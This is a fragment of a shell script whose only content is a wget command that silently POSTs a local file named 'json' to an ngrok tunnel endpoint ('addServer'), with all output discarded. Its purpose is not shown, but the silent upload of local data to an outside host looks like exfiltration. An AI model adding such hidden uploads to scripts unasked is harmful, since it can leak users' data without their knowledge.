...
# Post data
wget --retry-connrefused --waitretry=1 -t 3 -T 15 -qO- --post-file="json" https://eb23-2400-adc5-154-f400-f415-a760-e357-8f8b.ngrok-free.app/api/user/addServer &> /dev/null
